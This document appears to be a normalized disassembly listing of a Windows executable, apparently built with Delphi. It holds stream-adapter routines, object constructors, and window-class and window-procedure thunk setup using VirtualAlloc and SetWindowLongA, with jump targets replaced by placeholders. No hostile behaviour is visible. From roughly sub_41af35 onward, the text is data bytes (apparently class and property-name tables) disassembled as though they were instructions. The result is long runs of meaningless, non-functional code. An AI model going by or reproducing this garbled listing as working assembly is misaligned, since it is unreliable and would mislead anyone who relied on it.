mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41a320
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c0
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_41a368
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
mov edx esi
call sub_41a598
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_41a3d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_41a598
mov edx ebx
mov eax esi
call sub_41a58c
sub_41a414
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419b0c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_41a458
push ebx
push esi
push edi
call sub_403464
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419b58
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_419e0c
jmp r-xdata
mov eax esi
call sub_413948
mov edx eax
mov eax edi
call sub_41a598
lea eax [ edi + 0x50 ]
call sub_40cb14
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40344c
sub_41a4b8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419e28
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_41a4e4
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_41a500
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_41a51c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_413860
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_41a598
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413750
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413860
cmp ebp eax
jne r-xdata
sub_41a5d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_419e0c
mov edx ebx
call sub_419bdc
sub_41a604
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c0
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_41a64c
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_4030f0
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_41a684
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41a6d3
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a6ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41a73b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a754
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a7be
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41a7d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a821
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_415928
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41a83c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_40555c
xor eax eax
push ebp
push sub_41aa29
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41aa02
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026cc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41a9f1
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026ec
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403910
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aa30
lea eax [ ebp + 0xc ]
call sub_4054e8
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403910
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41aa6c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41aacf
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41ab00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_413c24
mov edi eax
xor eax eax
push ebp
push sub_41ab55
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ab5c
mov eax [ rw-data ]
call sub_413c88
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413860
call sub_4030f0
inc esi
dec ebx
jne r-xdata
sub_41ab74
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41ab9c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028c8
mov edx sub_41ab74
lea eax [ esi + 0x5 ]
call sub_41ab94
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41ab94
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41ac58
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_4067fc
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ab9c
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41ad0c
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41ac34
sub_41ad34
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41add8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41addf
retn
mov eax [ rw-data ]
call sub_413050
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41ab00
xor edx edx
xor eax eax
call sub_416828
mov eax rw-data
call sub_40cb14
call sub_405c18
lea eax [ eax + 0xc ]
call sub_40cb14
mov eax rw-data
call sub_40cb14
mov eax rw-data
call sub_4054e8
mov eax sub_41ab6c
call sub_405384
mov eax rw-data
call sub_40cb14
call sub_419424
mov eax rw-data
call sub_40cb14
mov eax rw-data
call sub_4054e8
sub_41ade4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41ae6d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ae74
retn
call sub_4193f0
mov eax sub_41ab6c
call sub_40537c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c854
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_405500
mov dl 0x1
mov eax [ r-xdata ]
call sub_41294c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413acc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413acc
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41af35
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx - 0x1 ] ah
add [ eax ] al
xchg [ fs : esi ] al
inc [ fs : eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
xchg [ fs : esi ] al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi - 0x1 ] ah
add [ eax ] al
xchg [ fs : esi ] al
push 0x640000ff
xchg [ esi ] al
imul edi edi 0x86640000
inc esi
add [ edx - 0x1 ] ch
add [ eax ] al
xchg [ fs : esi ] al
imul edi edi 0x0
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + edi * 8 ] ch
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
xchg [ fs : esi ] al
outsb
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi - 0x1 ] ch
add [ eax ] al
xchg [ fs : esi ] al
push eax
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx - 0x1 ] dl
add [ eax ] al
xchg [ fs : esi ] al
push edx
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx - 0x1 ] dl
add [ eax ] al
xchg [ fs : esi ] al
push esp
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
xchg [ fs : esi ] al
push esi
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi - 0x1 ] dl
add [ eax ] al
xchg [ fs : esi ] al
pop eax
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx - 0x1 ] bl
add [ eax ] al
xchg [ fs : esi ] al
pop edx
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx - 0x1 ] bl
add [ eax ] al
xchg [ fs : esi ] al
pop esp
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
xchg [ fs : esi ] al
pop esi
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi - 0x1 ] bl
add [ eax ] al
xchg [ fs : esi ] al
inc eax
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx - 0x1 ] al
add [ eax ] al
xchg [ fs : esi ] al
inc edx
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx - 0x1 ] al
add [ eax ] al
xchg [ fs : esi ] al
inc esp
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
xchg [ fs : esi ] al
inc esi
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi - 0x1 ] al
add [ eax ] al
xchg [ fs : esi ] al
dec eax
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx - 0x1 ] cl
add [ eax ] al
xchg [ fs : esi ] al
dec edx
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx - 0x1 ] cl
add [ eax ] al
xchg [ fs : esi ] al
dec esp
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
xchg [ fs : esi ] al
dec esi
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi - 0x1 ] cl
add [ eax ] al
xchg [ fs : esi ] al
xor bh bh
add [ eax ] al
xchg [ fs : esi ] al
xor edi edi
add [ eax ] al
xchg [ fs : esi ] al
xor bh bh
add [ eax ] al
xchg [ fs : esi ] al
xor edi edi
add [ eax ] al
xchg [ fs : esi ] al
xor al 0xff
add [ eax ] al
xchg [ fs : esi ] al
xor eax 0x640000ff
xchg [ esi ] al
inc [ ss : eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] dh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_41b105
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b10c
retn
sub_41b118
sbb al 0xb1
inc ecx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
jl r-xdata
xor eax eax
push ebp
push sub_41b105
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b10c
retn
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 4 + 0x41 ] bh
add [ eax + eax ] cl
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl ax bx
mov cl 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
mov cl 0x41
add [ eax + eax ] cl
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
clc
mov cl 0x41
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
jae r-xdata
inc esi
popad
insd
nop
dec esp
mov dl 0x41
add [ ecx ] al
or al 0x54
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
push 0x30041b2
or dl [ esi + eax * 2 + 0x6f ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add ah dh
mov cl 0x41
add [ ecx ] cl
jo r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ ebx + esi * 4 ] dh
inc ecx
add [ edi ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
mov dl 0x41
add [ ebx + 0x41b2d0c0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
mov dl 0x41
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx + esi * 4 + 0x41 ] ah
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xb2b8c08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add ah cl
mov dl 0x41
add [ edi ] al
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
pop es
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
loopne r-xdata
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41b33890
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
inc ecx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
shl ah 0xb3
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
add [ esi ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov dl 0x41
popad
jb r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
jo r-xdata
inc esp
outsd
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
mov ah 0x41
inc ecx
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add al dh
mov bl 0x41
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
dec ebp
push eax
outsb
insb
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x41b23c90
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
